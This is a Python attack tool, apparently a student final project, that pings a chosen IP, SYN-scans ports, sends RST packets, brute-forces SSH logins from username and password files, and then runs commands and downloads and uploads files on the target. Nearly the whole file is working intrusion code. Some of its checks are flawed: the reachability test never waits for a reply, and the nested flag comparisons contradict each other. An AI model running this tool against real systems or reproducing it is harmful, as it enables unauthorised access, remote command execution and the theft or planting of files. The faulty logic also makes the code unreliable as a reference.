# Libraries.
from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP
import paramiko
import time


# Definitions. Check if Target is available.
def check_ip(ip):
    # Try statement.
    try:
        # Verbose configuration.
        conf.verb = 0
        # ICMP packet.
        icmp_pkt = IP(dst=ip) / ICMP()
        # Check if Target is available.
        if icmp_pkt is not None:
            # Print results.
            print(f"\n[+] Target {ip} is available.")
            # Print and send results.
            print(f"[+] Sending ICMP packet to {ip}...\n"
                  f"{print(send(icmp_pkt, verbose=0))}")
            # Check if packet was sent successfully and received.
            icmp_result = icmp_pkt.show()
            # Print results.
            print("[+] ICMP result:"
                  f"\n{icmp_result}")
            # Return values.
            return True
    # Error handling.
    except Exception as error:
        # Print error.
        print(f"\n[-] Target {ip} is unreachable."
              f"\n[-] Error: {error}")
        # Return values.
        return False


# Definitions. Scan port with SYN/ACK packets.
def scan_port(port):
    # Source port. Generate random port from 1 to 65535.
    src_port = RandShort()
    # Verbose configuration.
    conf.verb = 0
    # SYN/ACK packet.
    syn_pkt = sr1(IP(dst=target_ip) / TCP(sport=src_port, dport=port, flags="S"), timeout=0.5)
    # Scan for open ports. Check all possible ports, flags and layers.
    if syn_pkt is not None:
        # Print results.
        print(f"[+] Port {port} is open.")
        # Check if packet in open port has TCP layers.
        if syn_pkt.haslayer(TCP):
            # Print results.
            print(f"[+] Port {port} has TCP layer.")
            # Check if TCP layer has SYN flag.
            if syn_pkt.getlayer(TCP).flags == "SA":
                # Print results.
                print(f"[+] Port {port} has 'SA' flag.")
                # Check all possible .flags values.
                if syn_pkt.getlayer(TCP).flags == 0x2:
                    # Print results.
                    print(f"[+] Port {port} has SYN flag.\n")
                    # Return values.
                    return True
                # Check all possible.flags values.
                elif syn_pkt.getlayer(TCP).flags == 0x10:
                    # Print results.
                    print(f"[+] Port {port} has ACK flag.\n")
                    # Return values.
                    return True
                # Check all possible.flags values.
                elif syn_pkt.getlayer(TCP).flags == 0x12:
                    # Print results.
                    print(f"[+] Port {port} has SYN/ACK flag.\n")
                    # Return values.
                    return True
                # There is no flags.
                else:
                    # Print results.
                    print(f"[-] Port {port} does not have SYN, ACK or SYN/ACK flag.\n")
                    # Return values.
                    return False
            # There is no SYN flag.
            else:
                # Print results.
                print(f"[-] Port {port} does not have 'SA' flag.\n")
                # Return values.
                return False
        # There is no TCP layer.
        else:
            # Print results.
            print(f"[-] Port {port} does not have TCP layer.\n")
            # Return values.
            return False
    # There is no SYN/ACK packet.
    else:
        # Print results.
        print(f"[-] Port {port} is closed.\n")
        # Return values.
        return False


# Definitions. Close connection with RST packet.
def close_port(port):
    # Source port. Generate random port from 1 to 65535.
    src_port = RandShort()
    # Verbose configuration.
    conf.verb = 0
    # RST packet.
    syn_pkt = sr1(IP(dst=target_ip) / TCP(sport=src_port, dport=port, flags="S"), timeout=0.5)
    # Scan for open ports. Check all possible ports, flags and layers.
    if syn_pkt is not None:
        # Print results.
        print(f"[+] Port {port} is open.")
        # Check if packet in open port has TCP layers.
        if syn_pkt.haslayer(TCP):
            # Print results.
            print(f"[+] Port {port} has TCP layer.")
            # Check if TCP layer has SYN flag.
            if syn_pkt.getlayer(TCP).flags == "SA":
                # Print results.
                print(f"[+] Port {port} has 'SA' flag.")
                # Check all possible .flags values.
                if syn_pkt.getlayer(TCP).flags == 0x2:
                    # Print results.
                    print(f"[+] Port {port} has SYN flag.")
                    # RST packet.
                    rst_pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=port, flags="R")
                    # Send RST packet to close port.
                    send(rst_pkt, verbose=0)
                    # Print results.
                    print(f"[+] Port {port} successfully closed.\n")
                    # Return values.
                    return True
                # Check all possible.flags values.
                elif syn_pkt.getlayer(TCP).flags == 0x10:
                    # Print results.
                    print(f"[+] Port {port} has ACK flag.")
                    # RST packet.
                    rst_pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=port, flags="R")
                    # Send RST packet to close port.
                    send(rst_pkt, verbose=0)
                    # Print results.
                    print(f"[+] Port {port} successfully closed.\n")
                    # Return values.
                    return True
                # Check all possible.flags values.
                elif syn_pkt.getlayer(TCP).flags == 0x12:
                    # Print results.
                    print(f"[+] Port {port} has SYN/ACK flag.")
                    # RST packet.
                    rst_pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=port, flags="R")
                    # Send RST packet to close port.
                    send(rst_pkt, verbose=0)
                    # Print results.
                    print(f"[+] Port {port} successfully closed.\n")
                    # Return values.
                    return True
                # There is no flags.
                else:
                    # Print results.
                    print(f"[-] Port {port} does not have SYN, ACK or SYN/ACK flag.\n")
                    # Return values.
                    return False
            # There is no SYN flag.    
            else:
                # Print results.
                print(f"[-] Port {port} does not have 'SA' flag.\n")
                # Return values.
                return False
        # There is no TCP layer.
        else:
            # Print results.
            print(f"[-] Port {port} does not have TCP layer.\n")
            # Return values.
            return False
    # There is no SYN/ACK packet to send RST packet.    
    else:
        # Print results.
        print(f"[-] Port {port} is closed.\n")
        # Return values.
        return False


# Definitions. Brute force function.
def brute_force(hostname, port, username, password, sock):
    # Print the combination massages.
    print("\n[+] Executing one of the combinations...")
    # Connect to the Target.
    ssh_paramiko_client.connect(hostname=hostname,
                                port=port,
                                username=username,
                                password=password,
                                timeout=4,
                                sock=sock)
    # Print results.
    print("[+] Successfully connected as:"
          f"\nUsername: {username}"
          f"\nPassword: {password}"
          f"\nTarget IP address: {target_ip}"
          f"\nPort: {open_port}")
    # Return values.
    return True


# Definitions. Execute command function.
def execute_command(command):
    # Print executing massages.
    print("\nExecuting command...\n")
    # Execute command.
    stdin, stdout, stderr = \
        ssh_paramiko_client.exec_command(command)
    # Print results.
    print("[+] Successfully executed command:"
          f"\n{stdout.read().decode('utf-8')}")
    # Return to Main Menu.
    print("\n[+] Returning to main menu...\n")
    # Return values.
    return True


# Definitions. Download file function.
def download_file(host_file_path, target_file_path):
    # Print progress massages.
    print("\n[+] Please be patient! Downloading...\n")
    # Open a file.
    host_file_name = open(host_file_path, "wb")
    # Open connection to the Target.
    sftp = ssh_paramiko_client.open_sftp()
    # Download file.
    sftp.getfo(target_file_path, host_file_name)
    # Print results.
    print("[+] Successfully downloaded:"
          f"\nfrom: {target_file_path}"
          f"\nto: {host_file_path}")
    # Close the file and connection.
    host_file_name.close()
    sftp.close()
    # Print results.
    print("\n[+] Returning to main menu...\n")
    # Return values.
    return True


# Definitions. Upload file function.
def upload_file(host_file_path, target_file_path):
    # Print progress massages.
    print("\n[+] Please be patient! Uploading...\n")
    # Open a file.
    host_file_name = open(host_file_path, "rb")
    # Open connection to the Target.
    sftp = ssh_paramiko_client.open_sftp()
    # Upload file.
    sftp.putfo(host_file_name, target_file_path)
    # Print result.
    print("[+] Successfully uploaded:"
          f"\nfrom: {host_file_path}"
          f"\nto: {target_file_path}")
    # Close the file and connection.
    host_file_name.close()
    sftp.close()
    # Print results.
    print("\n[+] Returning to main menu...\n")
    # Return values.
    return True


# Call Main Function.
if __name__ == "__main__":
    # Print welcome message and additional information.
    print("\n=================================================="
          "\nFINAL PROJECT"
          "\n=================================================="
          "\nInformation:"
          "\n=> For the sake of the project choose port range from 1-1023!"
          "\n==================================================")
    # Inputs.
    target_ip = input("\nEnter Target IP address: ")
    min_port = int(input("\nEnter min port: "))
    max_port = int(input("\nEnter max port: "))
    # Verbose configuration.
    conf.verb = 0
    # Variables.
    reg_ports = range(min_port, max_port + 1)
    open_ports = []
    close_ports = []
    # Print all values.
    print(f"\nTarget IP address: {target_ip}"
          f"\nMin port: {min_port}"
          f"\nMax port: {max_port}")
    # While loop.
    while True:
        # First Menu.
        first_menu = input("\n=================================================="
                           "\nMain Menu:"
                           "\n[1] Check Target availability and send ICMP packet."
                           "\n[2] Quit."
                           "\nEnter your choice: ")
        print("==================================================")
        # Choice 1.
        if first_menu == "1":
            # Call check_ip function.
            if check_ip(target_ip):
                # While loop.
                while True:
                    # Second Menu.
                    second_menu = input("\n=================================================="
                                        "\nMain Menu:"
                                        "\n[1] Scan the Target."
                                        "\n[2] Quit."
                                        "\nEnter your choice: ")
                    print("==================================================")
                    # Choice 1.
                    if second_menu == "1":
                        # For in statements. Checking all ports.
                        for port in reg_ports:
                            # Call scan_port function.
                            if scan_port(port):
                                # Add port to list.
                                open_ports.append(port)
                            # Go to else statement.
                            else:
                                # Add port to list.
                                close_ports.append(port)
                        # Print results.
                        print("All open ports:"
                              f"\n{open_ports}")
                        print("\nAll close ports:"
                              f"\n{close_ports}")
                        # While loop.
                        while True:
                            # Third Menu.
                            third_menu = input("\n=================================================="
                                               "\nMain Menu:"
                                               "\n[1] Scan and send RST packet to the Target."
                                               "\n[2] Brute force the credentials."
                                               "\n[3] Quit."
                                               "\nEnter your choice: ")
                            print("==================================================")
                            # Verbose configuration.
                            conf.verb = 0
                            # Variables.
                            closed_ports = []
                            closed_ports_by_rst_pkt = []
                            # Choice 1.
                            if third_menu == "1":
                                # For in statements. Closing active connection.
                                for port in reg_ports:
                                    # Call close_port function.
                                    if close_port(port):
                                        # Add port to list.
                                        closed_ports_by_rst_pkt.append(port)
                                    # Go to else statement.
                                    else:
                                        # Add port to list.
                                        closed_ports.append(port)
                                # Print results.
                                print("Closed ports without sending a packet:"
                                      f"\n{closed_ports}")
                                print("\nClosed ports by RST packet:"
                                      f"\n{closed_ports_by_rst_pkt}")
                            # Choice 2.
                            if third_menu == "2":
                                # Proxy configuration.
                                proxy = None
                                # SSH client variables and configuration.
                                ssh_paramiko_client = paramiko.SSHClient()
                                ssh_paramiko_client.load_system_host_keys()
                                ssh_paramiko_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                # Information about inputs.
                                print("\n=================================================="
                                      "\nImportant information!"
                                      "\n=> if you are working on Windows remember about two backslashes,"
                                      "\n==================================================")
                                # Inputs.
                                usernames_file_list = input("\nEnter path to file with usernames: ")
                                passwords_file_list = input("\nEnter path to file with passwords: ")
                                open_port = int(input("\nEnter open port from the list: "))
                                # Open files.
                                usernames_list = open(usernames_file_list, "r+")
                                passwords_list = open(passwords_file_list, "r+")
                                # Print results.
                                print("\nPlease be patient! Connecting to the Target...")
                                # Read lines in the files.
                                usernames = usernames_list.read().split("\n")
                                passwords = passwords_list.read().split("\n")
                                # Usernames loop.
                                for username in usernames:
                                    # Passwords loop.
                                    for password in passwords:
                                        # Set timeout for password loop.
                                        time.sleep(0.2)
                                        # Try statement. Brute force credentials.
                                        try:
                                            # Call brute_force function.
                                            brute_force(target_ip, open_port, username, password, proxy)
                                            # While loop.
                                            while True:
                                                # Fourth Menu.
                                                fourth_menu = input(
                                                    "\n=================================================="
                                                    "\nMain Menu:"
                                                    "\n[1] Execute command on the Target."
                                                    "\n[2] Download file from the Target."
                                                    "\n[3] Upload file to the Target."
                                                    "\n[4] Quit."
                                                    "\nEnter your choice: ")
                                                print("==================================================")
                                                # Choice 1.
                                                if fourth_menu == "1":
                                                    # Try statement. Execute command on the Target.
                                                    try:
                                                        # Inputs.
                                                        command = input("Enter Command: ")
                                                        # Call execute_command function.
                                                        execute_command(command)
                                                        # Continue processing.
                                                        continue
                                                    # Error handling.
                                                    except Exception as error:
                                                        # Print error.
                                                        print("[-] Unknown Error:"
                                                              f"\n{error}")
                                                        # Continue processing.
                                                        continue
                                                # Choice 2
                                                elif fourth_menu == "2":
                                                    # Try statement. Download file from the Target.
                                                    try:
                                                        # Inputs.
                                                        host_download_file_path = input(
                                                            "Enter path to your file: ")
                                                        target_download_file_path = input(
                                                            "Enter path to your Target file: ")
                                                        # Call download_file function.
                                                        download_file(host_download_file_path,
                                                                      target_download_file_path)
                                                        # Continue processing.
                                                        continue
                                                    # Error handling.
                                                    except Exception as error:
                                                        # Print error.
                                                        print("[-] Unknown Error:"
                                                              f"\n{error}")
                                                        # Continue processing.
                                                        continue
                                                # Choice 3
                                                elif fourth_menu == "3":
                                                    # Try statement. Upload file to the Target.
                                                    try:
                                                        # Inputs.
                                                        host_upload_file_path = input(
                                                            "Enter path to your file: ")
                                                        target_upload_file_path = input(
                                                            "Enter path to your Target file: ")
                                                        # Call upload_file function.
                                                        upload_file(host_upload_file_path,
                                                                    target_upload_file_path)
                                                        # Continue processing.
                                                        continue
                                                    # Error handling.
                                                    except Exception as error:
                                                        # Print error.
                                                        print("[-] Unknown Error:"
                                                              f"\n{error}")
                                                        # Continue processing.
                                                        continue
                                                # Choice 4
                                                elif fourth_menu == "4":
                                                    # Print results.
                                                    print("\n[+] Quitting...")
                                                    # Break the loop.
                                                    break
                                                # Invalid choice.
                                                else:
                                                    # Invalid choice.
                                                    print("\n[-] Invalid choice!")
                                                    # Continue to the next loop.
                                                    continue
                                            # Breaking the loop.
                                            break
                                        # Error handling.
                                        except paramiko.AuthenticationException as error:
                                            # Print error.
                                            print("[-] Authentication Error!"
                                                  f"\n{error}")
                                        # Error handling.
                                        except paramiko.ssh_exception.SSHException as error:
                                            # Print error.
                                            print("[-] SSH Error!"
                                                  f"\n{error}")
                                        # Error handling.
                                        except Exception as error:
                                            # Print error.
                                            print("[-] Unknown Error:\n"
                                                  f"\n{error}")
                                    # Else statement. Continue to the next loop.
                                    else:
                                        # Continue to the next loop.
                                        continue
                                    # Breaking the loop.
                                    break
                                # Closing connection.
                                usernames_list.close()
                                passwords_list.close()
                            # Choice 3.
                            elif third_menu == "3":
                                # Print results.
                                print("\n[+] Quitting...")
                                # Break the loop.
                                break
                            # Invalid choice.
                            else:
                                # Print error message.
                                print("\n[-] Invalid choice!")
                                # Continue to the next loop.
                                continue
                            # Break the loop.
                            break
                    # Choice 2.
                    elif second_menu == "2":
                        # Print results.
                        print("\n[+] Quitting...")
                        # Break the loop.
                        break
                    # Invalid choice.
                    else:
                        # Print error message.
                        print("\n[-] Invalid choice!")
                        # Continue to the next loop.
                        continue
                    # Break the loop.
                    break
            # Something went wrong.
            else:
                # Print error message.
                print("\n[-] Something went wrong! Invalid IP address or Target is not available.")
                # Continue to the next loop.
                continue
        # Choice 2.
        elif first_menu == "2":
            # Print results
            print("\n[+] Quitting...")
            # Break the loop.
            break
        # Invalid choice.
        else:
            # Print error message.
            print("\n[-] Invalid choice!")
            # Continue to the next loop.
            continue
            
